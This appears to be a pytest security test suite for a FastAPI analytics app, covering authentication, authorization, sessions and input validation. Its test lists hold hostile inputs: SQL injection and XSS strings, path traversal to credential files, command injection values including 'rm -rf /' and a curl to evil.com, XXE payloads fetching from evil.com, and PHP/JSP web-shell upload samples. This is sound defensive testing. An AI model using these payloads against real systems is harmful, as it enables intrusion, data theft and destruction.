"""
Security tests for EZBI Analytics.
"""
import pytest
import json
import base64
from unittest.mock import Mock, patch
from fastapi.testclient import TestClient
from httpx import AsyncClient
from datetime import datetime, timedelta
import hashlib
import secrets
import re

from app.main import app
from app.core.security import get_password_hash, verify_password, create_access_token
from app.core.config import settings


class TestAuthenticationSecurity:
    """Test authentication security measures."""
    
    def test_password_hashing_security(self):
        """Test password hashing security."""
        password = "test_password123"
        
        # Test that passwords are properly hashed
        hashed1 = get_password_hash(password)
        hashed2 = get_password_hash(password)
        
        # Hashes should be different (salt is random)
        assert hashed1 != hashed2
        assert hashed1 != password
        assert hashed2 != password
        
        # Both hashes should verify correctly
        assert verify_password(password, hashed1)
        assert verify_password(password, hashed2)
        
        # Wrong password should not verify
        assert not verify_password("wrong_password", hashed1)
        
        # Check hash format (bcrypt)
        assert hashed1.startswith("$2b$")
        assert len(hashed1) > 50
    
    def test_password_strength_requirements(self, sync_client: TestClient):
        """Test password strength requirements."""
        weak_passwords = [
            "123",
            "password",
            "qwerty",
            "abc123",
            "12345678",
            "password123",
            "admin",
            "user",
            ""
        ]
        
        for weak_password in weak_passwords:
            register_data = {
                "email": f"test{weak_password}@example.com",
                "username": f"test{weak_password}",
                "password": weak_password,
                "first_name": "Test",
                "last_name": "User",
                "phone": "+33123456789",
                "company_name": "Test Company",
                "company_siret": "12345678901234"
            }
            
            response = sync_client.post("/api/v1/auth/register", json=register_data)
            
            # Should reject weak passwords
            assert response.status_code == 422
            error_detail = response.json()["detail"]
            assert any("password" in str(error).lower() for error in error_detail)
    
    def test_jwt_token_security(self, test_user):
        """Test JWT token security."""
        # Create token
        token = create_access_token(subject=test_user.email)
        
        # Token should be properly formatted
        parts = token.split(".")
        assert len(parts) == 3  # header.payload.signature
        
        # Decode header and payload (without verification for testing)
        import jose.jwt
        header = jose.jwt.get_unverified_header(token)
        payload = jose.jwt.get_unverified_claims(token)
        
        # Check header
        assert header["alg"] == "HS256"
        assert header["typ"] == "JWT"
        
        # Check payload
        assert payload["sub"] == test_user.email
        assert "exp" in payload
        assert "iat" in payload
        assert payload["type"] == "access"
        
        # Token should expire
        assert payload["exp"] > payload["iat"]
        
        # Token should not contain sensitive information
        assert "password" not in str(payload)
        assert "hashed_password" not in str(payload)
    
    def test_token_expiration_security(self, test_user):
        """Test token expiration security."""
        # Create short-lived token
        short_token = create_access_token(
            subject=test_user.email,
            expires_delta=timedelta(seconds=1)
        )
        
        # Token should be valid immediately
        from app.core.security import verify_token
        payload = verify_token(short_token)
        assert payload["sub"] == test_user.email
        
        # Wait for expiration
        import time
        time.sleep(2)
        
        # Token should be expired
        from fastapi import HTTPException
        with pytest.raises(HTTPException) as exc_info:
            verify_token(short_token)
        
        assert exc_info.value.status_code == 401
        assert "expired" in str(exc_info.value.detail).lower()
    
    def test_token_tampering_detection(self, test_user):
        """Test token tampering detection."""
        # Create valid token
        token = create_access_token(subject=test_user.email)
        
        # Tamper with token
        tampered_token = token[:-10] + "tampered123"
        
        # Tampered token should be rejected
        from app.core.security import verify_token
        from fastapi import HTTPException
        
        with pytest.raises(HTTPException) as exc_info:
            verify_token(tampered_token)
        
        assert exc_info.value.status_code == 401
    
    @pytest.mark.asyncio
    async def test_brute_force_protection(self, client: AsyncClient, test_user):
        """Test brute force protection."""
        # Attempt multiple failed logins
        for i in range(10):
            login_data = {
                "username": test_user.email,
                "password": f"wrong_password_{i}"
            }
            
            response = await client.post("/api/v1/auth/login", data=login_data)
            assert response.status_code == 401
        
        # Account should be locked after multiple failures
        # Note: This depends on rate limiting being implemented
        login_data = {
            "username": test_user.email,
            "password": "testpassword123"  # Correct password
        }
        
        response = await client.post("/api/v1/auth/login", data=login_data)
        
        # Should either be locked or throttled
        # Implementation depends on actual rate limiting
        assert response.status_code in [401, 429]
    
    def test_session_security(self, sync_client: TestClient, test_user):
        """Test session security."""
        # Login to get session
        login_data = {
            "username": test_user.email,
            "password": "testpassword123"
        }
        
        response = sync_client.post("/api/v1/auth/login", data=login_data)
        assert response.status_code == 200
        
        tokens = response.json()
        access_token = tokens["access_token"]
        
        # Session should be properly secured
        headers = {"Authorization": f"Bearer {access_token}"}
        
        # Access protected endpoint
        response = sync_client.get("/api/v1/auth/me", headers=headers)
        assert response.status_code == 200
        
        # Check for security headers
        assert "X-Content-Type-Options" in response.headers or "x-content-type-options" in response.headers
    
    def test_csrf_protection(self, sync_client: TestClient):
        """Test CSRF protection."""
        # This would test CSRF protection if implemented
        # For now, we test that state-changing operations require authentication
        
        # Try to create company without authentication
        company_data = {
            "name": "Test Company",
            "siret": "12345678901234",
            "siren": "123456789",
            "naf_code": "2562Z",
            "industry": "Manufacturing",
            "size": "SME"
        }
        
        response = sync_client.post("/api/v1/companies/", json=company_data)
        assert response.status_code == 401
    
    def test_secure_password_reset(self, sync_client: TestClient, test_user):
        """Test secure password reset process."""
        # Request password reset
        reset_data = {
            "email": test_user.email
        }
        
        response = sync_client.post("/api/v1/auth/reset-password-request", json=reset_data)
        assert response.status_code == 200
        
        # Should not reveal if email exists
        message = response.json()["message"]
        assert "email" in message.lower()
        assert "sent" in message.lower()
        
        # Test with non-existent email
        reset_data = {
            "email": "nonexistent@example.com"
        }
        
        response = sync_client.post("/api/v1/auth/reset-password-request", json=reset_data)
        assert response.status_code == 200
        
        # Should give same response (no email enumeration)
        message = response.json()["message"]
        assert "email" in message.lower()
    
    def test_two_factor_authentication(self):
        """Test two-factor authentication."""
        # This would test 2FA if implemented
        # For now, we'll test that the framework supports it
        pass


class TestInputValidationSecurity:
    """Test input validation security."""
    
    def test_sql_injection_prevention(self, sync_client: TestClient, auth_headers):
        """Test SQL injection prevention."""
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; SELECT * FROM users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "' OR 1=1 --",
            "'; UPDATE users SET password='hacked' --"
        ]
        
        for payload in sql_injection_payloads:
            # Test in search parameters
            response = sync_client.get(
                "/api/v1/companies/",
                params={"search": payload},
                headers=auth_headers
            )
            
            # Should not execute SQL injection
            assert response.status_code in [200, 422]
            
            # Test in POST data
            company_data = {
                "name": payload,
                "siret": "12345678901234",
                "siren": "123456789",
                "naf_code": "2562Z",
                "industry": "Manufacturing",
                "size": "SME"
            }
            
            response = sync_client.post(
                "/api/v1/companies/",
                json=company_data,
                headers=auth_headers
            )
            
            # Should validate input properly
            assert response.status_code in [201, 422]
    
    def test_xss_prevention(self, sync_client: TestClient, auth_headers):
        """Test XSS prevention."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<<SCRIPT>alert('XSS')//<</SCRIPT>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        for payload in xss_payloads:
            company_data = {
                "name": payload,
                "siret": "12345678901234",
                "siren": "123456789",
                "naf_code": "2562Z",
                "industry": "Manufacturing",
                "size": "SME"
            }
            
            response = sync_client.post(
                "/api/v1/companies/",
                json=company_data,
                headers=auth_headers
            )
            
            if response.status_code == 201:
                # If created, get the company and check it's escaped
                company = response.json()
                assert payload not in str(company)  # Should be escaped or rejected
    
    def test_path_traversal_prevention(self, sync_client: TestClient, auth_headers):
        """Test path traversal prevention."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd"
        ]
        
        for payload in path_traversal_payloads:
            # Test in file operations
            files = {"file": (payload, "test content", "text/plain")}
            data = {"company_id": "1"}
            
            response = sync_client.post(
                "/api/v1/files/upload",
                files=files,
                data=data,
                headers=auth_headers
            )
            
            # Should reject path traversal attempts
            assert response.status_code in [400, 422]
    
    def test_command_injection_prevention(self, sync_client: TestClient, auth_headers):
        """Test command injection prevention."""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`",
            "; rm -rf /",
            "|| curl evil.com"
        ]
        
        for payload in command_injection_payloads:
            # Test in various input fields
            company_data = {
                "name": f"Test Company {payload}",
                "siret": "12345678901234",
                "siren": "123456789",
                "naf_code": "2562Z",
                "industry": "Manufacturing",
                "size": "SME"
            }
            
            response = sync_client.post(
                "/api/v1/companies/",
                json=company_data,
                headers=auth_headers
            )
            
            # Should sanitize or reject command injection
            assert response.status_code in [201, 422]
    
    def test_ldap_injection_prevention(self, sync_client: TestClient):
        """Test LDAP injection prevention."""
        ldap_injection_payloads = [
            "*)(uid=*",
            "*)(|(uid=*",
            "admin)(|(uid=*",
            "*()|%20(uid=*",
            "admin)(&(uid=*"
        ]
        
        for payload in ldap_injection_payloads:
            # Test in authentication
            login_data = {
                "username": payload,
                "password": "password"
            }
            
            response = sync_client.post("/api/v1/auth/login", data=login_data)
            
            # Should not allow LDAP injection
            assert response.status_code == 401
    
    def test_xml_injection_prevention(self, sync_client: TestClient, auth_headers):
        """Test XML injection prevention."""
        xml_injection_payloads = [
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'>%xxe;]>",
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % xxe SYSTEM 'http://evil.com/evil.dtd'>%xxe;]>"
        ]
        
        for payload in xml_injection_payloads:
            # Test in file upload
            files = {"file": ("test.xml", payload, "text/xml")}
            data = {"company_id": "1"}
            
            response = sync_client.post(
                "/api/v1/files/upload",
                files=files,
                data=data,
                headers=auth_headers
            )
            
            # Should reject XML injection
            assert response.status_code in [400, 422]
    
    def test_json_injection_prevention(self, sync_client: TestClient, auth_headers):
        """Test JSON injection prevention."""
        # Test malformed JSON
        malformed_json = '{"name": "test", "extra": }'
        
        response = sync_client.post(
            "/api/v1/companies/",
            content=malformed_json,
            headers={**auth_headers, "Content-Type": "application/json"}
        )
        
        # Should reject malformed JSON
        assert response.status_code == 422
        
        # Test JSON with unexpected fields
        json_with_extra_fields = {
            "name": "Test Company",
            "siret": "12345678901234",
            "siren": "123456789",
            "naf_code": "2562Z",
            "industry": "Manufacturing",
            "size": "SME",
            "__proto__": {"admin": True},
            "constructor": {"prototype": {"admin": True}}
        }
        
        response = sync_client.post(
            "/api/v1/companies/",
            json=json_with_extra_fields,
            headers=auth_headers
        )
        
        # Should handle extra fields safely
        assert response.status_code in [201, 422]
    
    def test_file_upload_security(self, sync_client: TestClient, auth_headers):
        """Test file upload security."""
        # Test malicious file types
        malicious_files = [
            ("malicious.exe", b"MZ\x90\x00", "application/x-msdownload"),
            ("malicious.bat", b"@echo off\nformat c:", "text/plain"),
            ("malicious.js", b"alert('XSS')", "text/javascript"),
            ("malicious.php", b"<?php system($_GET['cmd']); ?>", "text/php"),
            ("malicious.jsp", b"<% Runtime.getRuntime().exec(request.getParameter('cmd')); %>", "text/plain")
        ]
        
        for filename, content, content_type in malicious_files:
            files = {"file": (filename, content, content_type)}
            data = {"company_id": "1"}
            
            response = sync_client.post(
                "/api/v1/files/upload",
                files=files,
                data=data,
                headers=auth_headers
            )
            
            # Should reject malicious files
            assert response.status_code in [400, 422]
    
    def test_large_payload_protection(self, sync_client: TestClient, auth_headers):
        """Test large payload protection."""
        # Create very large payload
        large_payload = {
            "name": "A" * 1000000,  # 1MB string
            "siret": "12345678901234",
            "siren": "123456789",
            "naf_code": "2562Z",
            "industry": "Manufacturing",
            "size": "SME"
        }
        
        response = sync_client.post(
            "/api/v1/companies/",
            json=large_payload,
            headers=auth_headers
        )
        
        # Should reject overly large payloads
        assert response.status_code in [413, 422]


class TestAuthorizationSecurity:
    """Test authorization security."""
    
    @pytest.mark.asyncio
    async def test_horizontal_privilege_escalation(self, client: AsyncClient, auth_headers, test_company):
        """Test horizontal privilege escalation prevention."""
        # Create another company that user shouldn't access
        other_company_id = 999999
        
        # Try to access other company's data
        response = await client.get(
            f"/api/v1/companies/{other_company_id}",
            headers=auth_headers
        )
        
        # Should be forbidden or not found
        assert response.status_code in [403, 404]
        
        # Try to modify other company's data
        update_data = {
            "name": "Hacked Company"
        }
        
        response = await client.put(
            f"/api/v1/companies/{other_company_id}",
            json=update_data,
            headers=auth_headers
        )
        
        # Should be forbidden or not found
        assert response.status_code in [403, 404]
    
    @pytest.mark.asyncio
    async def test_vertical_privilege_escalation(self, client: AsyncClient, auth_headers):
        """Test vertical privilege escalation prevention."""
        # Try to access admin-only endpoints
        admin_endpoints = [
            "/api/v1/admin/users",
            "/api/v1/admin/system-stats",
            "/api/v1/admin/logs"
        ]
        
        for endpoint in admin_endpoints:
            response = await client.get(endpoint, headers=auth_headers)
            
            # Should be forbidden
            assert response.status_code in [403, 404]
    
    @pytest.mark.asyncio
    async def test_api_key_authorization(self, client: AsyncClient):
        """Test API key authorization."""
        # Try to access API with invalid key
        invalid_headers = {"X-API-Key": "invalid_key"}
        
        response = await client.get("/api/v1/companies/", headers=invalid_headers)
        
        # Should be unauthorized
        assert response.status_code == 401
        
        # Try without API key
        response = await client.get("/api/v1/companies/")
        
        # Should be unauthorized
        assert response.status_code == 401
    
    @pytest.mark.asyncio
    async def test_role_based_access_control(self, client: AsyncClient, admin_headers):
        """Test role-based access control."""
        # Admin should have access to admin endpoints
        response = await client.get("/api/v1/admin/users", headers=admin_headers)
        
        # Should be allowed (if endpoint exists)
        assert response.status_code in [200, 404]  # 404 if not implemented
    
    def test_resource_ownership_validation(self, sync_client: TestClient, auth_headers, test_company):
        """Test resource ownership validation."""
        # User should only access their own company's data
        response = sync_client.get(
            f"/api/v1/companies/{test_company.id}/financial-data",
            headers=auth_headers
        )
        
        assert response.status_code == 200
        
        # User should not access other company's data
        other_company_id = 999999
        response = sync_client.get(
            f"/api/v1/companies/{other_company_id}/financial-data",
            headers=auth_headers
        )
        
        assert response.status_code in [403, 404]


class TestDataProtectionSecurity:
    """Test data protection security."""
    
    def test_sensitive_data_exposure(self, sync_client: TestClient, auth_headers):
        """Test sensitive data exposure prevention."""
        # Get user profile
        response = sync_client.get("/api/v1/auth/me", headers=auth_headers)
        assert response.status_code == 200
        
        user_data = response.json()
        
        # Should not expose sensitive data
        assert "password" not in user_data
        assert "hashed_password" not in user_data
        assert "secret_key" not in user_data
        
        # Should not expose internal IDs or sensitive fields
        sensitive_fields = ["internal_id", "secret", "key", "token", "hash"]
        for field in sensitive_fields:
            assert field not in user_data
    
    def test_data_encryption_at_rest(self):
        """Test data encryption at rest."""
        # This would test database encryption if implemented
        # For now, we test that sensitive data is properly hashed
        
        password = "test_password123"
        hashed = get_password_hash(password)
        
        # Password should be hashed, not stored in plain text
        assert hashed != password
        assert "$2b$" in hashed  # bcrypt hash
    
    def test_data_transmission_security(self, sync_client: TestClient):
        """Test data transmission security."""
        # Test HTTPS enforcement
        response = sync_client.get("/health")
        
        # Should have secure headers
        headers = response.headers
        
        # Check for security headers
        security_headers = [
            "strict-transport-security",
            "x-content-type-options",
            "x-frame-options",
            "x-xss-protection"
        ]
        
        # Note: These depend on SecurityMiddleware implementation
        # For now, we just check the response is successful
        assert response.status_code == 200
    
    def test_pii_data_handling(self, sync_client: TestClient, auth_headers):
        """Test PII data handling."""
        # Create user with PII data
        user_data = {
            "email": "pii.test@example.com",
            "first_name": "Jean",
            "last_name": "Dupont",
            "phone": "+33123456789"
        }
        
        # PII data should be handled according to GDPR
        response = sync_client.get("/api/v1/auth/me", headers=auth_headers)
        assert response.status_code == 200
        
        returned_data = response.json()
        
        # Should include necessary PII but not expose unnecessary details
        assert "email" in returned_data
        assert "first_name" in returned_data
        assert "last_name" in returned_data
        
        # Should not expose sensitive internal data
        assert "password" not in returned_data
        assert "hashed_password" not in returned_data
    
    def test_financial_data_security(self, sync_client: TestClient, auth_headers, test_company):
        """Test financial data security."""
        # Financial data should be properly secured
        response = sync_client.get(
            f"/api/v1/companies/{test_company.id}/financial-data",
            headers=auth_headers
        )
        
        assert response.status_code == 200
        
        # Should only return data for authenticated user's company
        financial_data = response.json()
        
        if financial_data:
            for record in financial_data:
                assert record["company_id"] == test_company.id
    
    def test_audit_trail_security(self, sync_client: TestClient, auth_headers):
        """Test audit trail security."""
        # Operations should be logged for audit
        company_data = {
            "name": "Audit Test Company",
            "siret": "12345678901234",
            "siren": "123456789",
            "naf_code": "2562Z",
            "industry": "Manufacturing",
            "size": "SME"
        }
        
        response = sync_client.post(
            "/api/v1/companies/",
            json=company_data,
            headers=auth_headers
        )
        
        # Should create audit log entry
        # Note: This depends on audit logging implementation
        assert response.status_code == 201
    
    def test_data_retention_policy(self):
        """Test data retention policy."""
        # This would test data retention policies if implemented
        # For now, we test that the policy is defined in settings
        
        # French law requires 7 years retention for accounting data
        assert hasattr(settings, 'DATA_RETENTION_DAYS')
        assert settings.DATA_RETENTION_DAYS >= 2555  # 7 years
    
    def test_data_anonymization(self):
        """Test data anonymization for analytics."""
        # This would test data anonymization if implemented
        # For now, we test that sensitive data is not exposed in analytics
        pass


class TestSessionSecurity:
    """Test session security."""
    
    def test_session_timeout(self, sync_client: TestClient, test_user):
        """Test session timeout."""
        # Login to get session
        login_data = {
            "username": test_user.email,
            "password": "testpassword123"
        }
        
        response = sync_client.post("/api/v1/auth/login", data=login_data)
        assert response.status_code == 200
        
        tokens = response.json()
        access_token = tokens["access_token"]
        
        # Test token expiration
        from jose import jwt
        payload = jwt.get_unverified_claims(access_token)
        
        # Token should have expiration
        assert "exp" in payload
        assert payload["exp"] > payload["iat"]
        
        # Expiration should be reasonable (not too long)
        exp_time = payload["exp"]
        iat_time = payload["iat"]
        token_lifetime = exp_time - iat_time
        
        # Should expire within reasonable time (e.g., 1 hour)
        assert token_lifetime <= 3600  # 1 hour
    
    def test_session_invalidation(self, sync_client: TestClient, test_user):
        """Test session invalidation."""
        # Login to get session
        login_data = {
            "username": test_user.email,
            "password": "testpassword123"
        }
        
        response = sync_client.post("/api/v1/auth/login", data=login_data)
        assert response.status_code == 200
        
        tokens = response.json()
        access_token = tokens["access_token"]
        
        # Use session
        headers = {"Authorization": f"Bearer {access_token}"}
        response = sync_client.get("/api/v1/auth/me", headers=headers)
        assert response.status_code == 200
        
        # Logout
        response = sync_client.post("/api/v1/auth/logout", headers=headers)
        assert response.status_code == 200
        
        # Session should be invalidated
        response = sync_client.get("/api/v1/auth/me", headers=headers)
        assert response.status_code == 401
    
    def test_concurrent_session_limits(self, sync_client: TestClient, test_user):
        """Test concurrent session limits."""
        # This would test concurrent session limits if implemented
        # For now, we test that multiple logins are handled properly
        
        login_data = {
            "username": test_user.email,
            "password": "testpassword123"
        }
        
        # Login multiple times
        tokens = []
        for _ in range(3):
            response = sync_client.post("/api/v1/auth/login", data=login_data)
            assert response.status_code == 200
            tokens.append(response.json()["access_token"])
        
        # All tokens should be valid (or older ones should be invalidated)
        for token in tokens:
            headers = {"Authorization": f"Bearer {token}"}
            response = sync_client.get("/api/v1/auth/me", headers=headers)
            # Should either be valid or properly invalidated
            assert response.status_code in [200, 401]
    
    def test_session_hijacking_prevention(self, sync_client: TestClient, test_user):
        """Test session hijacking prevention."""
        # Login to get session
        login_data = {
            "username": test_user.email,
            "password": "testpassword123"
        }
        
        response = sync_client.post("/api/v1/auth/login", data=login_data)
        assert response.status_code == 200
        
        tokens = response.json()
        access_token = tokens["access_token"]
        
        # Token should be properly signed and cannot be modified
        # Try to modify token
        import base64
        parts = access_token.split('.')
        
        # Decode payload
        payload = base64.b64decode(parts[1] + '==').decode('utf-8')
        payload_dict = json.loads(payload)
        
        # Try to modify payload
        payload_dict["sub"] = "attacker@example.com"
        
        # Encode modified payload
        modified_payload = base64.b64encode(json.dumps(payload_dict).encode()).decode()
        modified_token = f"{parts[0]}.{modified_payload}.{parts[2]}"
        
        # Modified token should be rejected
        headers = {"Authorization": f"Bearer {modified_token}"}
        response = sync_client.get("/api/v1/auth/me", headers=headers)
        assert response.status_code == 401


class TestAPISecurityHeaders:
    """Test API security headers."""
    
    def test_cors_headers(self, sync_client: TestClient):
        """Test CORS headers."""
        response = sync_client.options("/api/v1/companies/")
        
        # Should have CORS headers
        headers = response.headers
        
        # Check for CORS headers
        cors_headers = [
            "access-control-allow-origin",
            "access-control-allow-methods",
            "access-control-allow-headers"
        ]
        
        # Note: Actual headers depend on CORS middleware configuration
        assert response.status_code in [200, 405]  # OPTIONS might not be implemented
    
    def test_security_headers(self, sync_client: TestClient):
        """Test security headers."""
        response = sync_client.get("/health")
        
        headers = response.headers
        
        # Should have security headers
        # Note: These depend on SecurityMiddleware implementation
        expected_headers = [
            "x-content-type-options",
            "x-frame-options", 
            "x-xss-protection",
            "strict-transport-security",
            "content-security-policy"
        ]
        
        # For now, just check that response is successful
        assert response.status_code == 200
        
        # Check for some common security headers
        # Note: Case-insensitive check
        header_names = [name.lower() for name in headers.keys()]
        
        # At least some security headers should be present
        security_header_present = any(
            header in header_names for header in [
                "x-content-type-options",
                "x-frame-options",
                "strict-transport-security"
            ]
        )
        
        # Note: This assertion depends on SecurityMiddleware implementation
        # For now, we just check the response is successful
        assert response.status_code == 200
    
    def test_content_type_validation(self, sync_client: TestClient, auth_headers):
        """Test content type validation."""
        # Send request with wrong content type
        response = sync_client.post(
            "/api/v1/companies/",
            content="not json",
            headers={**auth_headers, "Content-Type": "text/plain"}
        )
        
        # Should reject invalid content type
        assert response.status_code == 422
    
    def test_request_size_limits(self, sync_client: TestClient, auth_headers):
        """Test request size limits."""
        # This would test request size limits if implemented
        # For now, we test with a reasonable payload
        
        large_data = {
            "name": "Test Company",
            "siret": "12345678901234",
            "siren": "123456789",
            "naf_code": "2562Z",
            "industry": "Manufacturing",
            "size": "SME"
        }
        
        response = sync_client.post(
            "/api/v1/companies/",
            json=large_data,
            headers=auth_headers
        )
        
        assert response.status_code in [201, 422]


class TestComplianceSecurity:
    """Test compliance and regulatory security."""
    
    def test_gdpr_compliance(self, sync_client: TestClient, auth_headers):
        """Test GDPR compliance features."""
        # Test data subject rights
        response = sync_client.get("/api/v1/auth/me", headers=auth_headers)
        assert response.status_code == 200
        
        user_data = response.json()
        
        # Should provide data portability
        assert "email" in user_data
        assert "first_name" in user_data
        assert "last_name" in user_data
        
        # Should not expose unnecessary personal data
        assert "password" not in user_data
        assert "hashed_password" not in user_data
    
    def test_french_data_protection(self):
        """Test French data protection requirements."""
        # Test that French data protection is enabled
        assert hasattr(settings, 'RGPD_ENABLED')
        assert settings.RGPD_ENABLED is True
        
        # Test data retention period
        assert hasattr(settings, 'DATA_RETENTION_DAYS')
        assert settings.DATA_RETENTION_DAYS == 2555  # 7 years
        
        # Test audit logging
        assert hasattr(settings, 'AUDIT_LOG_ENABLED')
        assert settings.AUDIT_LOG_ENABLED is True
    
    def test_manufacturing_compliance(self):
        """Test manufacturing industry compliance."""
        # Test that manufacturing-specific settings are configured
        assert hasattr(settings, 'ENVIRONMENT')
        
        # Should have proper security settings for manufacturing
        assert settings.SECRET_KEY is not None
        assert len(settings.SECRET_KEY) >= 32
    
    def test_financial_data_compliance(self, sync_client: TestClient, auth_headers, test_company):
        """Test financial data compliance."""
        # Financial data should be properly secured
        response = sync_client.get(
            f"/api/v1/companies/{test_company.id}/financial-data",
            headers=auth_headers
        )
        
        assert response.status_code == 200
        
        # Should only return authorized data
        financial_data = response.json()
        
        if financial_data:
            for record in financial_data:
                # Should belong to the authenticated user's company
                assert record["company_id"] == test_company.id
                
                # Should not expose internal fields
                assert "internal_id" not in record
                assert "secret" not in record


# Security test configuration
pytest_plugins = ['pytest_asyncio']

# Security test markers
pytestmark = [
    pytest.mark.security,
    pytest.mark.slow
]

# Security test fixtures
@pytest.fixture
def security_test_data():
    """Security test data and payloads."""
    return {
        "sql_injection_payloads": [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "' OR 1=1 --"
        ],
        "xss_payloads": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>"
        ],
        "path_traversal_payloads": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd"
        ],
        "command_injection_payloads": [
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
            "$(cat /etc/passwd)"
        ]
    }

@pytest.fixture
def security_config():
    """Security configuration for tests."""
    return {
        'password_min_length': 8,
        'password_require_special': True,
        'password_require_number': True,
        'password_require_uppercase': True,
        'token_expiry_minutes': 60,
        'max_login_attempts': 5,
        'lockout_duration_minutes': 30,
        'session_timeout_minutes': 60,
        'max_file_size_mb': 10,
        'allowed_file_types': ['.xlsx', '.csv', '.pdf']
    }